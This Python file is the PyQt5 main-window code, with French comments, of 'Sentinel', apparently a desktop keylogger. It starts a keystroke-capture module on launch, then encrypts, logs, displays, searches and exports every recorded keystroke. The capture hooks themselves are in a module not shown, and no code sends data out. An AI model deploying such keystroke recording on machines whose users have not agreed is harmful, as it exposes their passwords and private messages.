# ui/main_window.py

import os
import sys
import threading
import time
import logging
from datetime import datetime

from PyQt5.QtCore import (
    Qt, QSize, QTimer, pyqtSlot, QObject, pyqtSignal
)
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import (
    QMainWindow, QWidget, QHBoxLayout, QVBoxLayout,
    QFrame, QLabel, QPushButton, QToolButton, QLineEdit, QTextEdit,
    QFileDialog, QMessageBox, QSpacerItem, QSizePolicy
)

# Imports de nos modules
from managers.file_manager import FileManager
from managers.encryption_manager import EncryptionManager
from managers.log_manager import LogManager
from keylogger.keylogger import KeyLogger

# Dialogs
from ui.dialogs import SettingsDialog, InformationDialog

# Thèmes
from ui.themes import THEMES

# -------------------------------------
# Configuration du logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    filename='xyconis_sentinel.log',
    filemode='a'
)

# ===============================
# === Signaux pour mise à jour UI (thread-safety) ===

class KeyUpdateSignal(QObject):
    key_received = pyqtSignal(str, str)   # (encrypted, plain)
    stats_updated = pyqtSignal(int, str)  # (total_keys, last_time)

# ===============================
# === Fenêtre Principale ===

class ModernSentinelApp(QMainWindow):
    """
    Sentinel v2.0 - Interface "22-Modern UI" + Dialogues + Multiples Thèmes
    -----------------------------------------------------------------------
    - Keylogger (pynput)
    - Gestion des fichiers (FileManager) et chiffrement (EncryptionManager)
    - LogManager pour lire/écrire/effacer/exporter
    - Interface PyQt5 moderne :
        * Barre supérieure sombre (titre + icônes)
        * Menu latéral sombre avec boutons (icône + texte)
        * Zone centrale avec sous-barre (recherche, statut, stats) + 2 cadres logs
    - Recherche en temps réel (filtrage) dans logs chiffrés/déchiffrés
    - Boutons pour pause, actualiser, exporter, effacer
    - Boutons "Settings" et "Information" ouvrant des boîtes de dialogue
    - 4 thèmes : "Modern Dark", "Light", "Blue", "Green"
    - Les pop-ups Settings et Information ont une taille fixe
    """

    def __init__(self):
        super().__init__()
        self.setWindowTitle("Sentinel v3.0")
        self.resize(1200, 700)

        # État
        self.is_paused = False
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.total_keys = 0
        self.last_time = "--:--:--"
        self.current_theme = "Modern Dark"  # Thème par défaut

        # Modules
        self.file_manager = FileManager()
        self.encryption_manager = EncryptionManager(self.file_manager)
        self.log_manager = LogManager(self.file_manager, self.encryption_manager)

        # Signaux
        self.key_update_signal = KeyUpdateSignal()
        self.key_update_signal.key_received.connect(self._update_logs_slot)
        self.key_update_signal.stats_updated.connect(self._update_stats_slot)

        # UI
        self._init_ui()
        self._apply_styles()

        # Démarrage keylogger + thread
        self._start_services()

        # Timer pour rafraîchir l'affichage des stats
        self.stats_timer = QTimer(self)
        self.stats_timer.timeout.connect(self._refresh_stats)
        self.stats_timer.start(200)

    # ------------------ PARTIE UI ------------------

    def _init_ui(self):
        # Widget central
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        # Layout principal vertical (topbar + zone corps)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # 1) Barre supérieure
        self.topbar = self._create_topbar()
        main_layout.addWidget(self.topbar)

        # 2) Corps : sidebar + contenu
        body_frame = QFrame()
        body_layout = QHBoxLayout(body_frame)
        body_layout.setContentsMargins(0, 0, 0, 0)
        body_layout.setSpacing(0)

        # Menu latéral
        self.sidebar = self._create_sidebar()
        body_layout.addWidget(self.sidebar)

        # Zone de contenu
        self.content = self._create_content_area()
        body_layout.addWidget(self.content)

        main_layout.addWidget(body_frame)

    def _create_topbar(self) -> QFrame:
        topbar = QFrame()
        topbar.setObjectName("TopBar")

        hlayout = QHBoxLayout(topbar)
        hlayout.setContentsMargins(15, 0, 15, 0)
        hlayout.setSpacing(10)

        # Titre
        self.title_label = QLabel("SENTINEL")
        self.title_label.setObjectName("TopBarTitle")
        hlayout.addWidget(self.title_label)

        # Espace intermédiaire
        hlayout.addStretch()

        # Icône notifications
        self.btn_notifications = QToolButton()
        self.btn_notifications.setIcon(QIcon("icons/bell.png"))  # À adapter
        self.btn_notifications.setIconSize(QSize(20, 20))
        self.btn_notifications.setToolTip("Notifications")
        hlayout.addWidget(self.btn_notifications)

        # Icône profil
        self.btn_profile = QToolButton()
        self.btn_profile.setIcon(QIcon("icons/user.png"))  # À adapter
        self.btn_profile.setIconSize(QSize(20, 20))
        self.btn_profile.setToolTip("Profile")
        hlayout.addWidget(self.btn_profile)

        return topbar

    def _create_sidebar(self) -> QFrame:
        sidebar = QFrame()
        sidebar.setObjectName("SideBar")
        sidebar.setFixedWidth(200)

        vlayout = QVBoxLayout(sidebar)
        vlayout.setContentsMargins(0, 10, 0, 10)
        vlayout.setSpacing(5)

        # Boutons du haut
        self.btn_pause = self._create_menu_button("Pause", "icons/pause.png")
        self.btn_pause.clicked.connect(self._toggle_pause)
        vlayout.addWidget(self.btn_pause)

        self.btn_refresh = self._create_menu_button("Actualiser Logs", "icons/refresh.png")
        self.btn_refresh.clicked.connect(self._refresh_logs)
        vlayout.addWidget(self.btn_refresh)

        self.btn_export = self._create_menu_button("Exporter Logs", "icons/export.png")
        self.btn_export.clicked.connect(self._export_logs_dialog)
        vlayout.addWidget(self.btn_export)

        self.btn_clear = self._create_menu_button("Effacer Logs", "icons/clear.png")
        self.btn_clear.clicked.connect(self._clear_logs)
        vlayout.addWidget(self.btn_clear)

        # Espace intermédiaire
        vlayout.addSpacerItem(QSpacerItem(20, 20, QSizePolicy.Minimum, QSizePolicy.Expanding))

        # Bas du menu
        self.btn_settings = self._create_menu_button("Settings", "icons/settings.png")
        self.btn_settings.clicked.connect(self._open_settings)
        vlayout.addWidget(self.btn_settings)

        self.btn_info = self._create_menu_button("Information", "icons/info.png")
        self.btn_info.clicked.connect(self._open_information)
        vlayout.addWidget(self.btn_info)

        # Label bas de page
        self.lbl_copyright = QLabel("© 2025, Xyconis")
        self.lbl_copyright.setObjectName("Copyright")
        self.lbl_copyright.setAlignment(Qt.AlignCenter)
        vlayout.addWidget(self.lbl_copyright)

        return sidebar

    def _create_menu_button(self, text: str, icon_path: str) -> QPushButton:
        btn = QPushButton(text)
        btn.setObjectName("SideBarButton")
        btn.setIcon(QIcon(icon_path))
        btn.setIconSize(QSize(20, 20))
        btn.setMinimumHeight(40)
        btn.setCheckable(False)
        return btn

    def _create_content_area(self) -> QFrame:
        content = QFrame()
        content.setObjectName("ContentArea")

        main_layout = QVBoxLayout(content)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # Sous-barre : statut, champ recherche, stats
        sub_top_bar = QFrame()
        sub_top_bar_layout = QHBoxLayout(sub_top_bar)
        sub_top_bar_layout.setContentsMargins(10, 5, 10, 5)
        sub_top_bar_layout.setSpacing(10)

        self.status_label = QLabel("Statut : Actif")
        self.status_label.setObjectName("StatusLabel")
        sub_top_bar_layout.addWidget(self.status_label)

        sub_top_bar_layout.addStretch()

        self.search_edit = QLineEdit()
        self.search_edit.setPlaceholderText("Rechercher en temps réel...")
        self.search_edit.setFixedWidth(300)
        self.search_edit.textChanged.connect(self._update_filtered_logs)
        sub_top_bar_layout.addWidget(self.search_edit)

        self.stats_label = QLabel("Total frappes : 0 | Dernière frappe : --:--:--")
        sub_top_bar_layout.addWidget(self.stats_label)

        main_layout.addWidget(sub_top_bar, 0)

        # Corps : 2 cadres logs
        logs_layout = QHBoxLayout()
        logs_layout.setSpacing(15)
        logs_layout.setContentsMargins(10, 10, 10, 10)

        # Card logs chiffrés
        card_enc = QFrame()
        card_enc.setObjectName("Card")
        card_enc_layout = QVBoxLayout(card_enc)
        enc_title = QLabel("Logs Chiffrés")
        enc_title.setStyleSheet("font-weight:bold; font-size:16px;")
        card_enc_layout.addWidget(enc_title)

        self.text_encrypted = QTextEdit()
        self.text_encrypted.setReadOnly(True)
        card_enc_layout.addWidget(self.text_encrypted)

        # Card logs déchiffrés
        card_dec = QFrame()
        card_dec.setObjectName("Card")
        card_dec_layout = QVBoxLayout(card_dec)
        dec_title = QLabel("Logs Déchiffrés")
        dec_title.setStyleSheet("font-weight:bold; font-size:16px;")
        card_dec_layout.addWidget(dec_title)

        self.text_decrypted = QTextEdit()
        self.text_decrypted.setReadOnly(True)
        card_dec_layout.addWidget(self.text_decrypted)

        logs_layout.addWidget(card_enc, 1)
        logs_layout.addWidget(card_dec, 1)

        main_layout.addLayout(logs_layout, 1)

        return content

    # ------------------ APPLICATION DU THÈME ------------------

    def _apply_styles(self):
        """
        Applique le style en fonction du thème courant self.current_theme
        """
        from ui.themes import THEMES
        if self.current_theme in THEMES:
            self.setStyleSheet(THEMES[self.current_theme])
        else:
            self.setStyleSheet(THEMES["Modern Dark"])

        # Mise à jour de la couleur du label statut selon l'état
        if self.is_paused:
            self.status_label.setStyleSheet("font-size:16px; font-weight:bold; color: #FF2E63;")
        else:
            self.status_label.setStyleSheet("font-size:16px; font-weight:bold; color: #08D9D6;")

    # ------------------ PARTIE KEYLOGGER + LOGS ------------------

    def _start_services(self):
        self.keylogger = KeyLogger(self._handle_key_press)
        self.keylogger.start()
        self.buffer_thread = threading.Thread(target=self._process_buffer, daemon=True)
        self.buffer_thread.start()

    def _handle_key_press(self, key_text):
        if self.is_paused:
            return
        enc = self.encryption_manager.encrypt(key_text)
        if enc:
            with self.buffer_lock:
                self.buffer.append((enc, key_text))

    def _process_buffer(self):
        while True:
            if self.buffer:
                with self.buffer_lock:
                    encrypted, plain = self.buffer.pop(0)
                # Enregistrement dans le fichier
                self.log_manager.add_log(plain)
                # Mise à jour de l'UI via signaux
                self.total_keys += 1
                now = datetime.now().strftime('%H:%M:%S')
                self.last_time = now
                self.key_update_signal.key_received.emit(encrypted, plain)
                self.key_update_signal.stats_updated.emit(self.total_keys, now)
            time.sleep(0.01)

    @pyqtSlot(str, str)
    def _update_logs_slot(self, encrypted, plain):
        # À chaque frappe ajoutée, on relance le filtrage en temps réel
        self._update_filtered_logs()

    @pyqtSlot(int, str)
    def _update_stats_slot(self, total, now):
        self.stats_label.setText(f"Total frappes : {total} | Dernière frappe : {now}")

    def _refresh_stats(self):
        self.stats_label.setText(f"Total frappes : {self.total_keys} | Dernière frappe : {self.last_time}")

    def _update_filtered_logs(self):
        search_term = self.search_edit.text().strip().lower()
        all_encrypted = self.log_manager.get_logs()

        self.text_encrypted.clear()
        self.text_decrypted.clear()

        for enc_line in all_encrypted:
            dec_line = self.encryption_manager.decrypt(enc_line)
            if not search_term or (search_term in dec_line.lower()):
                self.text_encrypted.append(enc_line)
                self.text_decrypted.append(dec_line)

    # ------------------ BOUTONS SIDEBAR ------------------

    def _toggle_pause(self):
        self.is_paused = not self.is_paused
        if self.is_paused:
            self.btn_pause.setText("Reprendre")
            self.btn_pause.setIcon(QIcon("icons/play.png"))
            self.status_label.setText("Statut : Pause")
            self.status_label.setStyleSheet("font-size:16px; font-weight:bold; color: #FF2E63;")
        else:
            self.btn_pause.setText("Pause")
            self.btn_pause.setIcon(QIcon("icons/pause.png"))
            self.status_label.setText("Statut : Actif")
            self.status_label.setStyleSheet("font-size:16px; font-weight:bold; color: #08D9D6;")

    def _refresh_logs(self):
        self._update_filtered_logs()

    def _export_logs_dialog(self):
        path, _ = QFileDialog.getSaveFileName(
            self,
            "Exporter Logs",
            "",
            "Fichiers texte (*.txt);;Tous les fichiers (*)"
        )
        if not path:
            return
        rep = QMessageBox.question(
            self,
            "Exporter",
            "Exporter les logs chiffrés ?\nOui pour chiffrés, Non pour déchiffrés.",
            QMessageBox.Yes | QMessageBox.No
        )
        enc = (rep == QMessageBox.Yes)
        if self.log_manager.export_logs(path, enc):
            QMessageBox.information(self, "Exportation", "Logs exportés avec succès!")
        else:
            QMessageBox.critical(self, "Erreur", "Échec de l'exportation des logs.")

    def _clear_logs(self):
        rep = QMessageBox.question(
            self,
            "Confirmation",
            "Êtes-vous sûr de vouloir effacer tous les logs?",
            QMessageBox.Yes | QMessageBox.No
        )
        if rep == QMessageBox.Yes:
            if self.log_manager.clear_logs():
                self.text_encrypted.clear()
                self.text_decrypted.clear()
                self.total_keys = 0
                self.last_time = "--:--:--"
                self.stats_label.setText("Total frappes : 0 | Dernière frappe : --:--:--")
                QMessageBox.information(self, "Information", "Tous les logs ont été effacés.")
            else:
                QMessageBox.critical(self, "Erreur", "Impossible d'effacer les logs.")

    # ------------------ SETTINGS & INFORMATION ------------------

    def _open_settings(self):
        dialog = SettingsDialog(self, current_theme=self.current_theme)
        if dialog.exec_() == dialog.Accepted:
            settings = dialog.get_settings()
            logging.info(f"Settings mis à jour : {settings}")

            # Appliquer le thème choisi
            self.current_theme = settings["theme"]
            self._apply_styles()
            # Autres réglages possibles (encryption_enabled, autostart, etc.)

    def _open_information(self):
        dialog = InformationDialog(self)
        dialog.exec_()

    # ------------------ FERMETURE ------------------

    def closeEvent(self, event):
        # Arrêter le keylogger proprement
        if hasattr(self, 'keylogger') and self.keylogger:
            self.keylogger.stop()
        logging.info("Fermeture de l'application.")
        super().closeEvent(event)
